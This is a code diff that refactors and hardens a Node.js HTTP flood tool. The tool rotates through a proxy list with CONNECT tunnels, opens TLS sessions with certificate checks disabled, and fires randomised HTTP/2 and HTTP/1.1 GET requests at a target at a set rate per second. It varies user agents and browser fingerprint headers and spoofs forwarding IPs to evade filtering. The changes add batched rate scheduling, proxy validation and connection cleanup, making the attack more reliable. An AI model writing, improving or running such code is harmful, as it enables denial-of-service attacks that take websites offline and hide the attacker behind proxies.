@@ -41,9 +41,28 @@ const secureContextOptions = {
 };
 const secureContext = tls.createSecureContext(secureContextOptions);
 
-const headers = {};
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+}
+
+function parseProxy(line) {
+    const trimmed = line.trim();
+    if (!trimmed || trimmed.startsWith('#')) {
+        return null;
+    }
+
+    try {
+        const parsed = new url.URL(`http://${trimmed}`);
+        return {
+            host: parsed.hostname,
+            port: Number(parsed.port) || 80
+        };
+    } catch (error) {
+        if (debug) {
+            console.log(error);
+        }
+        return null;
+    }
 }
 
 function randomIntn(min, max) {
@@ -173,6 +192,8 @@ function replaceRandPlaceholder(value) {
 
 const _argh = process.argv.slice(2);
 const { args: argh, headers: parsedHeaders } = parseHLineArgs(_argh);
+const hasCustomHeaders = Object.keys(parsedHeaders).length !== 0;
+const customHeaderEntries = Object.entries(parsedHeaders);
 
 class Messages {
     Alert() {
@@ -253,9 +274,26 @@ const cplist = [
 ];
 
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
-var proxies = readLines(args.proxyFile);
-const parsedTarget = url.parse(args.target);
+const proxyList = readLines(args.proxyFile)
+    .map(parseProxy)
+    .filter(Boolean);
 
+if (!proxyList.length) {
+    log("ERROR".red + "  " + "Proxy file is empty or invalid".white);
+    process.exit(1);
+}
+
+const parsedTarget = url.parse(args.target);
+const targetPort = parsedTarget.port || 443;
+const authorityHost = parsedTarget.hostname && parsedTarget.hostname.includes(":") && !parsedTarget.hostname.startsWith('[')
+    ? `[${parsedTarget.hostname}]`
+    : parsedTarget.hostname || parsedTarget.host;
+const targetAuthority = `${authorityHost}:${targetPort}`;
+const connectPayloadBuffer = Buffer.from(`CONNECT ${targetAuthority} HTTP/1.1\r\nHost: ${targetAuthority}\r\nConnection: Keep-Alive\r\n\r\n`);
+
+function pickProxy() {
+    return proxyList[randomIntn(0, proxyList.length)];
+}
 
 const headerBuilder = {
     userAgent: [
@@ -374,21 +412,212 @@ const httpStatusCodes = {
     "503": { "Description": "Service Unavailable", "Color": "brightRed" }
 };
 
+function createPathResolver() {
+    const targetPath = parsedTarget.path || "/";
+    const builder = () => {
+        if (query === '%RAND%') {
+            return `${targetPath}?${randstr(5)}=${randstr(25)}`;
+        }
+        if (!query) {
+            return targetPath;
+        }
+        return `${targetPath}?${query}`;
+    };
+
+    return {
+        staticPath: builder(),
+        dynamicPath: builder
+    };
+}
+
+function buildHttp2BaseHeaders(path, userAgent, language) {
+    const baseHeaders = {
+        ":method": "GET",
+        ":authority": parsedTarget.host,
+        ":scheme": "https",
+        ":path": path,
+        "x-forwarded-proto": "https",
+        "upgrade-insecure-requests": "1",
+        "sec-fetch-user": "?1",
+        "x-requested-with": "XMLHttpRequest",
+        "user-agent": userAgent,
+        "sec-fetch-dest": randomElement(headerBuilder.Sec.dest),
+        "sec-fetch-mode": randomElement(headerBuilder.Sec.mode),
+        "sec-fetch-site": "none",
+        "accept": randomElement(headerBuilder.accept),
+        "accept-language": language,
+        "accept-encoding": randomElement(headerBuilder.acceptEncoding),
+    };
+
+    if (extra) {
+        baseHeaders["DNT"] = randomElement(headerBuilder.Custom.dnt);
+        baseHeaders["RTT"] = randomElement(headerBuilder.Custom.rtt);
+        baseHeaders["Downlink"] = randomElement(headerBuilder.Custom.downlink);
+        baseHeaders["Device-Memory"] = randomElement(headerBuilder.Custom.devicememory);
+        baseHeaders["Ect"] = randomElement(headerBuilder.Custom.ect);
+        baseHeaders["TE"] = randomElement(headerBuilder.Custom.te);
+        baseHeaders["DPR"] = "2.0";
+        baseHeaders["Service-Worker-Navigation-Preload"] = "true";
+        baseHeaders["sec-ch-ua-arch"] = "x86";
+        baseHeaders["sec-ch-ua-bitness"] = "64";
+    }
+
+    if (spoof) {
+        const spoofHeaders = [
+            "X-Real-Client-IP",
+            "X-Real-IP",
+            "X-Remote-Addr",
+            "X-Remote-IP",
+            "X-Forwarder",
+            "X-Forwarder-For",
+            "X-Forwarder-Host",
+            "X-Forwarding",
+            "X-Forwarding-For",
+            "Forwarded",
+            "Forwarded-For",
+            "Forwarded-Host",
+        ];
+
+        spoofHeaders.forEach(headerName => {
+            baseHeaders[headerName] = getRandomPrivateIP();
+        });
+    }
+
+    return baseHeaders;
+}
+
+function cloneHeaders(template, keys) {
+    const cloned = {};
+    for (let i = 0; i < keys.length; i++) {
+        const key = keys[i];
+        cloned[key] = template[key];
+    }
+    return cloned;
+}
+
+function writePayloadAndEnd(stream) {
+    if (typeof payload === "undefined") {
+        stream.end();
+        return;
+    }
+
+    if (payload === '%RAND%') {
+        stream.end(randstr(25));
+        return;
+    }
+
+    if (payload === '%BYTES%') {
+        stream.end(crypto.randomBytes(64));
+        return;
+    }
+
+    stream.end(payload);
+}
+
+function logStatusIfNeeded(statusCode) {
+    if (!_log || typeof statusCode === "undefined") {
+        return;
+    }
+
+    const numericStatus = typeof statusCode === "number" ? statusCode : parseInt(statusCode, 10);
+    if (!Number.isFinite(numericStatus)) {
+        return;
+    }
+
+    if (_log !== true) {
+        const expected = parseInt(_log, 10);
+        if (!Number.isFinite(expected) || numericStatus !== expected) {
+            return;
+        }
+    }
+
+    const statusMeta = httpStatusCodes[String(numericStatus)];
+    if (!statusMeta) {
+        return;
+    }
+
+    const description = statusMeta.Description[statusMeta.Color];
+    log(`${numericStatus} ${description}`);
+}
+
+function determineChunkSize(rate) {
+    if (rate >= 2048) return 512;
+    if (rate >= 1024) return 256;
+    if (rate >= 512) return 128;
+    if (rate >= 256) return 64;
+    if (rate >= 128) return 32;
+    if (rate >= 64) return 16;
+    return Math.max(1, rate);
+}
+
+function scheduleRpsLoop(rate, sendFn) {
+    if (!Number.isFinite(rate) || rate <= 0) {
+        return () => { };
+    }
+
+    const chunkSize = determineChunkSize(rate);
+    let active = true;
+
+    const dispatchBatch = () => {
+        if (!active) {
+            return;
+        }
+
+        let remaining = rate;
+
+        const pump = () => {
+            if (!active || remaining <= 0) {
+                return;
+            }
+
+            const currentBatch = Math.min(chunkSize, remaining);
+            remaining -= currentBatch;
+
+            for (let i = 0; i < currentBatch; i++) {
+                try {
+                    sendFn();
+                } catch (error) {
+                    if (debug) {
+                        console.log(error);
+                    }
+                }
+            }
+
+            if (remaining > 0) {
+                setImmediate(pump);
+            }
+        };
+
+        pump();
+    };
+
+    const intervalId = setInterval(dispatchBatch, 1000);
+    dispatchBatch();
+
+    return () => {
+        if (!active) {
+            return;
+        }
+        active = false;
+        clearInterval(intervalId);
+    };
+}
 
 class NetSocket {
     constructor() { }
 
     HTTP(options, callback) {
-        const parsedAddr = options.address.split(":");
-        const addrHost = parsedAddr[0];
-        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
-        const buffer = new Buffer.from(payload);
+        const target = options.address && options.address.includes(":")
+            ? options.address
+            : `${options.address}:443`;
+        const buffer = options.connectPayload || Buffer.from(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\nConnection: Keep-Alive\r\n\r\n`);
 
         const connection = net.connect({
             host: options.host,
             port: options.port
         });
 
+        connection.setNoDelay(true);
         connection.setTimeout(options.timeout * 600000);
         connection.setKeepAlive(true, 100000);
 
@@ -448,102 +677,47 @@ function generateSpoofedFingerprint(userAgent, acceptLanguage) {
 
 
 function http2run() {
-    const proxyAddr = randomElement(proxies);
-    const parsedProxy = proxyAddr.split(":");
-
-    const selectedUserAgent = randomElement(headerBuilder.userAgent); //`Mozilla/5.0 (Windows NT 10.0; ${randomElement(headerBuilder.Custom.version)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomIntn(104, 116)}.0.0.0 Safari/537.36`; // randomElement(headerBuilder.userAgent)
-    const selectedLanguage = randomElement(headerBuilder.acceptLang); //`Mozilla/5.0 (Windows NT 10.0; ${randomElement(headerBuilder.Custom.version)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomIntn(105, 116)}.0.0.0 Safari/537.36`;
-
-    // STATIC
-    headers[":method"] = "GET";
-    headers[":authority"] = parsedTarget.host;
-    headers[":scheme"] = "https";
-    headers["x-forwarded-proto"] = "https";
-    headers["upgrade-insecure-requests"] = "1";
-    headers["sec-fetch-user"] = "?1";
-    headers["x-requested-with"] = "XMLHttpRequest";
-
-
-    // DYNAMIC
-    if (query === '%RAND%') {
-        headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
-    } else if (!query) {
-        headers[":path"] = parsedTarget.path;
-    } else {
-        headers[":path"] = parsedTarget.path + "?" + query;
+    const proxy = pickProxy();
+    if (!proxy) {
+        return;
     }
 
-    headers["user-agent"] = selectedUserAgent;
-    headers["sec-fetch-dest"] = randomElement(headerBuilder.Sec.dest);
-    headers["sec-fetch-mode"] = randomElement(headerBuilder.Sec.mode);
-    headers["sec-fetch-site"] = "none";
-    headers["accept"] = randomElement(headerBuilder.accept);
-    headers["accept-language"] = selectedLanguage;
-    headers["accept-encoding"] = randomElement(headerBuilder.acceptEncoding);
-
-    // EXTRA
-    if (extra) {
-        headers["DNT"] = randomElement(headerBuilder.Custom.dnt);
-        headers["RTT"] = randomElement(headerBuilder.Custom.rtt);
-        headers["Downlink"] = randomElement(headerBuilder.Custom.downlink);
-        headers["Device-Memory"] = randomElement(headerBuilder.Custom.devicememory);
-        headers["Ect"] = randomElement(headerBuilder.Custom.ect);
-        headers["TE"] = randomElement(headerBuilder.Custom.te);
-
-        headers["DPR"] = "2.0";
-        headers["Service-Worker-Navigation-Preload"] = "true";
-        headers["sec-ch-ua-arch"] = "x86";
-        headers["sec-ch-ua-bitness"] = "64";
-    }
-
-    // SPOOF
-    if (spoof) {
-        headers["X-Real-Client-IP"] = getRandomPrivateIP();
-        headers["X-Real-IP"] = getRandomPrivateIP();
-        headers["X-Remote-Addr"] = getRandomPrivateIP();
-        headers["X-Remote-IP"] = getRandomPrivateIP();
-        headers["X-Forwarder"] = getRandomPrivateIP();
-        headers["X-Forwarder-For"] = getRandomPrivateIP();
-        headers["X-Forwarder-Host"] = getRandomPrivateIP();
-        headers["X-Forwarding"] = getRandomPrivateIP();
-        headers["X-Forwarding-For"] = getRandomPrivateIP();
-        headers["Forwarded"] = getRandomPrivateIP();
-        headers["Forwarded-For"] = getRandomPrivateIP();
-        headers["Forwarded-Host"] = getRandomPrivateIP();
-    }
+    const selectedUserAgent = randomElement(headerBuilder.userAgent);
+    const selectedLanguage = randomElement(headerBuilder.acceptLang);
+    const { staticPath, dynamicPath } = createPathResolver();
+    const baseHeaders = buildHttp2BaseHeaders(staticPath, selectedUserAgent, selectedLanguage);
+    const baseHeaderKeys = Object.keys(baseHeaders);
+    const resolvePath = hasCustomHeaders ? dynamicPath : () => staticPath;
 
     const proxyOptions = {
-        host: parsedProxy[0],
-        port: ~~parsedProxy[1],
-        address: parsedTarget.host + ":443",
+        host: proxy.host,
+        port: proxy.port,
+        address: targetAuthority,
         timeout: 100,
+        connectPayload: connectPayloadBuffer
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
-        if (error) return
+        if (error || !connection) {
+            return;
+        }
 
         connection.setKeepAlive(true, 600000);
+        connection.setNoDelay(true);
 
         const tlsOptions = {
             secure: true,
             ALPNProtocols: ['h2'],
             socket: connection,
-            //secureOptions: secureOptions,
             minVersion: 'TLSv1.2',
-            //ciphers: ciphers,
-            //sigalgs: this._sigalgs,
-            //ecdhCurve: this.ecdhCurve,
             host: parsedTarget.host,
             rejectUnauthorized: false,
             servername: parsedTarget.host,
-            //fingerprint: generatedFP,
-            //secureProtocol: "TLS_client_method",
-            //secureContext: secureContext,
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-
         tlsConn.setKeepAlive(true, 60000);
+        tlsConn.setNoDelay(true);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
@@ -568,199 +742,189 @@ function http2run() {
             enablePush: false
         });
 
-        client.on("connect", () => {
-            setInterval(() => {
-                for (let i = 0; i < args.rate; i++) {
-                    let dynHeaders = {}
+        let stopLoop = () => { };
 
-                    if (Object.keys(parsedHeaders).length !== 0) {
-                        let dynPath;
-
-                        if (query === '%RAND%') {
-                            dynPath = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
-                        } else if (!query) {
-                            dynPath = parsedTarget.path;
-                        } else {
-                            dynPath = parsedTarget.path + "?" + query;
-                        }
-
-                        dynHeaders = {
-                            ":method": "GET",
-                            ":authority": parsedTarget.host,
-                            ":scheme": "https",
-                            ":path": dynPath,
-                            ...parsedHeaders
-                        };
-
-                    } else {
-                        dynHeaders = {
-                            ...headers
-                        };
-                    }
-
-                    const request = client.request(dynHeaders)
-
-                        .on("response", response => {
-                            const statusCode = response[':status'];
-
-                            if (_log) {
-                                const description = httpStatusCodes[statusCode].Description[httpStatusCodes[statusCode].Color];
-
-                                if (_log === true) {
-                                    if (httpStatusCodes[statusCode]) {
-                                        log(`${statusCode} ${description}`)
-                                    }
-                                } else {
-                                    if (httpStatusCodes[statusCode] && statusCode === parseInt(_log)) {
-                                        log(`${statusCode} ${description}`)
-                                    }
-                                }
-                            }
-
-
-                            if (payload === '%RAND%') {
-                                request.write(randstr(25));
-                            } else if (!payload) { } else if (payload === '%BYTES%') {
-                                request.end();
-                                request.write(crypto.randomBytes(64));
-                            } else {
-                                request.end();
-                                request.write(payload);
-                            }
-
-                            request.close();
-                            request.destroy();
-                            return
-                        });
-
-                    request.end();
+        const cleanup = (() => {
+            let cleaned = false;
+            return () => {
+                if (cleaned) {
+                    return;
                 }
-            }, 1000)
+                cleaned = true;
+                stopLoop();
+                client.destroy();
+                tlsConn.destroy();
+                connection.destroy();
+            };
+        })();
+
+        const createRequestHeaders = hasCustomHeaders
+            ? () => ({
+                ":method": "GET",
+                ":authority": parsedTarget.host,
+                ":scheme": "https",
+                ":path": resolvePath(),
+                ...parsedHeaders
+            })
+            : () => cloneHeaders(baseHeaders, baseHeaderKeys);
+
+        const sendRequest = () => {
+            if (client.destroyed || client.closed) {
+                return;
+            }
+
+            const headersPayload = createRequestHeaders();
+
+            const request = client.request(headersPayload);
+
+            const finalizeStream = () => {
+                if (request.destroyed) {
+                    return;
+                }
+                request.close();
+                request.destroy();
+            };
+
+            request.on("response", response => {
+                logStatusIfNeeded(response[':status']);
+                finalizeStream();
+            });
+
+            request.on("error", finalizeStream);
+
+            writePayloadAndEnd(request);
+        };
+
+        client.once("connect", () => {
+            stopLoop = scheduleRpsLoop(args.rate, sendRequest);
         });
 
-        client.on("close", () => {
-            client.destroy();
-            connection.destroy();
-            return
-        });
-    }), function (error, response, body) { };
+        client.on("error", cleanup);
+        client.on("close", cleanup);
+        tlsConn.on("error", cleanup);
+        tlsConn.on("close", cleanup);
+        connection.on("error", cleanup);
+        connection.on("close", cleanup);
+    });
 }
 
 
-function http1run() {
-    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
-    proxy = proxy.split(':');
+function buildDefaultHttp1Headers(queryString) {
+    const headerLines = [
+        `GET ${queryString} HTTP/1.1`,
+        `Host: ${parsedTarget.host}`,
+        `Referer: ${args.target}`,
+        `Origin: ${args.target}`,
+        `Accept: ${randomElement(headerBuilder.accept)}`,
+        `User-Agent: ${randomElement(headerBuilder.userAgent)}`,
+        "Upgrade-Insecure-Requests: 1",
+        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}`,
+        `Accept-Language: ${randomElement(headerBuilder.acceptLang)}`,
+        "Cache-Control: max-age=0",
+        "Connection: Keep-Alive",
+    ];
 
-    var req = http.request({
-        host: proxy[0],
-        port: proxy[1],
-        ciphers: cipper,
-        method: 'CONNECT',
-        path: parsedTarget.host + ":443"
-    }, (err) => {
-        req.end();
-        return;
-    })
-
-    var queryString;
-
-    if (query === '%RAND%') {
-        queryString = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
-    } else if (!query) {
-        queryString = parsedTarget.path;
-    } else {
-        queryString = parsedTarget.path + "?" + query;
+    if (spoof) {
+        headerLines.push(`X-Forwarding-For: ${getRandomPrivateIP()}`);
     }
 
-    req.on('connect', function (res, socket, head) {
-        var tlsConnection = tls.connect({
+    headerLines.push("", "");
+    return headerLines.join("\r\n");
+}
+
+function buildCustomHttp1Headers(queryString) {
+    const headerLines = [
+        `GET ${queryString} HTTP/1.1`,
+        `Host: ${parsedTarget.host}`,
+        "Connection: keep-alive",
+    ];
+
+    for (let i = 0; i < customHeaderEntries.length; i++) {
+        const [name, value] = customHeaderEntries[i];
+        headerLines.push(`${name}: ${value}`);
+    }
+
+    headerLines.push("", "");
+    return headerLines.join("\r\n");
+}
+
+function http1run() {
+    const proxy = pickProxy();
+    if (!proxy) {
+        return;
+    }
+
+    const { staticPath } = createPathResolver();
+    const queryString = staticPath;
+
+    const req = http.request({
+        host: proxy.host,
+        port: proxy.port,
+        ciphers: cipper,
+        method: 'CONNECT',
+        path: targetAuthority
+    });
+
+    req.on('connect', (_, socket) => {
+        socket.setKeepAlive(true, 600000);
+        socket.setNoDelay(true);
+
+        let stopLoop = () => { };
+
+        const tlsConnection = tls.connect({
             host: parsedTarget.host,
             ciphers: cipper,
             secureProtocol: 'TLS_method',
             servername: parsedTarget.host,
             secure: true,
             rejectUnauthorized: false,
-            socket: socket
-        }, function () {
-            setInterval(() => {
-                for (let j = 0; j < args.rate; j++) {
-                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
-                        "Host: " + parsedTarget.host + "\r\n" +
-                        "Referer: " + args.target + "\r\n" +
-                        "Origin: " + args.target + "\r\n" +
-                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
-                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
-                        "Upgrade-Insecure-Requests: 1\r\n" +
-                        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
-                        `Accept-Language: ${randomElement(headerBuilder.acceptLang)}\r\n` +
-                        "Cache-Control: max-age=0\r\n" +
-                        "Connection: Keep-Alive\r\n";
-
-                    if (spoof) {
-                        headers += `X-Forwarding-For: ${getRandomPrivateIP()}\r\n`;
-                    }
-
-                    headers += `\r\n`;
-
-
-                    function convertToHttp1Headers(parsedHeaders) {
-                        let http1Headers = '';
-                        for (const headerName in parsedHeaders) {
-                            http1Headers += `${headerName}: ${parsedHeaders[headerName]}\r\n`;
-                        }
-                        http1Headers += "\r\n";
-                        return http1Headers;
-                    }
-
-                    let dynHeaders;
-
-                    if (Object.keys(parsedHeaders).length !== 0) {
-                        const http1HeadersString = convertToHttp1Headers(parsedHeaders);
-
-                        dynHeaders = "GET " + queryString + " HTTP/1.1\r\n";
-                        dynHeaders += "Host: " + parsedTarget.host + "\r\n"
-                        dynHeaders += "Connection: keep-alive\r\n"
-                        dynHeaders += http1HeadersString;
-                        dynHeaders += "\r\n";
-
-                    } else {
-                        dynHeaders = headers;
-                    }
-
-                    tlsConnection.write(dynHeaders);
+            socket
+        }, () => {
+            stopLoop = scheduleRpsLoop(args.rate, () => {
+                if (!tlsConnection.writable || tlsConnection.destroyed) {
+                    return;
                 }
-            })
-        })
 
-        tlsConnection.on('error', function (data) {
-            tlsConnection.end();
-            tlsConnection.destroy();
-        })
+                const payload = hasCustomHeaders
+                    ? buildCustomHttp1Headers(queryString)
+                    : buildDefaultHttp1Headers(queryString);
 
-        tlsConnection.on("data", (chunk) => {
+                tlsConnection.write(payload);
+            });
+        });
+
+        const cleanup = (() => {
+            let cleaned = false;
+            return () => {
+                if (cleaned) {
+                    return;
+                }
+                cleaned = true;
+                stopLoop();
+                tlsConnection.destroy();
+                socket.destroy();
+            };
+        })();
+
+        tlsConnection.on('data', chunk => {
             const responseLines = chunk.toString().split('\r\n');
             const firstLine = responseLines[0];
-            const statusCode = parseInt(firstLine.split(' ')[1], 10);
-
-            if (_log) {
-                const description = httpStatusCodes[statusCode].Description[httpStatusCodes[statusCode].Color];
-                if (_log === true) {
-                    if (httpStatusCodes[statusCode]) {
-                        log(`${statusCode} ${description}`)
-                    }
-                } else {
-                    if (httpStatusCodes[statusCode] && statusCode === parseInt(_log)) {
-                        log(`${statusCode} ${description}`)
-                    }
-                }
+            if (!firstLine) {
+                return;
             }
+            const statusCode = parseInt(firstLine.split(' ')[1], 10);
+            logStatusIfNeeded(statusCode);
+        });
 
-            delete chunk;
-            setTimeout(function () {
-                return delete tlsConnection;
-            }, 10000);
-        })
-    })
+        tlsConnection.on('error', cleanup);
+        tlsConnection.on('close', cleanup);
+        socket.on('error', cleanup);
+        socket.on('close', cleanup);
+    });
+
+    req.on('error', () => {
+        req.destroy();
+    });
 
     req.end();
 }
